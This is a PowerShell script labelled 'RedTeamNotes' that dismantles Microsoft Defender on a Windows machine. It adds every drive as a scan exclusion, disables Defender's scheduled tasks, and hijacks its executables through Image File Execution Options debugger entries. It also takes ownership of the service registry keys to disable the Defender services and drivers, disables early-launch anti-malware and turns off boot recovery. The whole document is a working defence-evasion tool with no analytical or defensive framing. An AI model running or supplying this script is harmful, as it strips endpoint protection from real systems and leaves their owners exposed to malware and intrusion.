<#
.SYNOPSIS
    RedTeamNotes: Native Hardened Defender Removal (Ownership Focus).
.DESCRIPTION
    Advanced registry manipulation by taking ownership from TrustedInstaller.
#>

[CmdletBinding()]
param ([Switch]$PurgeFiles)

Write-Host "[*] RedTeamNotes Native Neutralization initialized." -ForegroundColor Cyan

# --- Helper: Force Ownership and FullControl ---
function Set-RegistryOwner {
    param([string]$Path)
    # Registry paths need to be converted to Windows API format for ownership
    $CleanPath = $Path.Replace("HKLM:\", "HKEY_LOCAL_MACHINE\")
    
    # 1. Take Ownership using native SeTakeOwnershipPrivilege logic
    # Administrators group SID: S-1-5-32-544
    $AdminSid = New-Object System.Security.Principal.SecurityIdentifier("S-1-5-32-544")
    $Acl = Get-Acl -Path $Path
    $Acl.SetOwner($AdminSid)
    
    try {
        Set-Acl -Path $Path -AclObject $Acl -ErrorAction Stop
        
        # 2. Grant Full Control
        $Ar = New-Object System.Security.AccessControl.RegistryAccessRule(
            "Administrators", "FullControl", "Allow"
        )
        $Acl.SetAccessRule($Ar)
        Set-Acl -Path $Path -AclObject $Acl -ErrorAction Stop
        return $true
    } catch {
        return $false
    }
}

# 1. Pre-flight Check: Tamper Protection
$TPPath = "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features"
if ((Get-ItemProperty $TPPath).TamperProtection -ne 4) {
    Write-Host "[!] CRITICAL: Tamper Protection is ENABLED. Manual GUI disablement REQUIRED." -ForegroundColor Yellow
    Write-Host "    Path: Settings > Virus & threat protection > Manage settings > Tamper Protection"
}

# 2. Step 1/5: Global Exclusion
Write-Host "[Step 1/5] Injecting global filesystem exclusions..."
67..90 | ForEach-Object {
    $Drive = [char]$_ + ":\"
    if (Test-Path $Drive) { Add-MpPreference -ExclusionPath $Drive -ErrorAction SilentlyContinue }
}

# 3. Step 2/5: Disable Tasks
Write-Host "[Step 2/5] Neutralizing Scheduled Tasks..."
Get-ScheduledTask -TaskPath "\Microsoft\Windows\Windows Defender\*" | Disable-ScheduledTask -ErrorAction SilentlyContinue

# 4. Step 3/5: IFEO Redirection (with Ownership)
Write-Host "[Step 3/5] Applying IFEO redirection (Hijacking binaries)..."
$IfeoRoot = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options"
$Binaries = @("MsMpEng.exe", "MpCmdRun.exe", "MpSigStub.exe")

foreach ($Bin in $Binaries) {
    $Key = "$IfeoRoot\${Bin}"
    if (-not (Test-Path $Key)) { 
        # Attempt to create key; if fails, try taking ownership of parent
        try { New-Item $Key -Force | Out-Null } catch { Set-RegistryOwner -Path $IfeoRoot | Out-Null; New-Item $Key -Force | Out-Null }
    }
    Set-ItemProperty $Key -Name "Debugger" -Value "ntsd.exe -d" -ErrorAction SilentlyContinue
}

# 5. Step 4/5: Service Neutralization (Aggressive ACL)
Write-Host "[Step 4/5] Disabling Kernel Services and Drivers..."
$Services = @("WinDefend", "WdNisSvc", "Sense", "SecurityHealthService", "WdBoot", "WdFilter", "WdNisDrv")

foreach ($Svc in $Services) {
    $RegPath = "HKLM:\SYSTEM\CurrentControlSet\Services\${Svc}"
    if (Test-Path $RegPath) {
        if (Set-RegistryOwner -Path $RegPath) {
            Set-ItemProperty -Path $RegPath -Name "Start" -Value 4 -ErrorAction SilentlyContinue
            Write-Host "    [-] ${Svc}: Disabled" -ForegroundColor Gray
        } else {
            Write-Host "    [X] ${Svc}: Failed (Tamper Protection still blocking)" -ForegroundColor Red
        }
    }
}

# 6. Step 5/5: ELAM & BCD
Write-Host "[Step 5/5] Finalizing Environment..."
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\EarlyLaunch" -Name "DisableAntiMalware" -Value 1 -ErrorAction SilentlyContinue
bcdedit /set {current} recoveryenabled No | Out-Null

Write-Host "[#] RedTeamNotes: Operation complete. REBOOT REQUIRED." -ForegroundColor Green
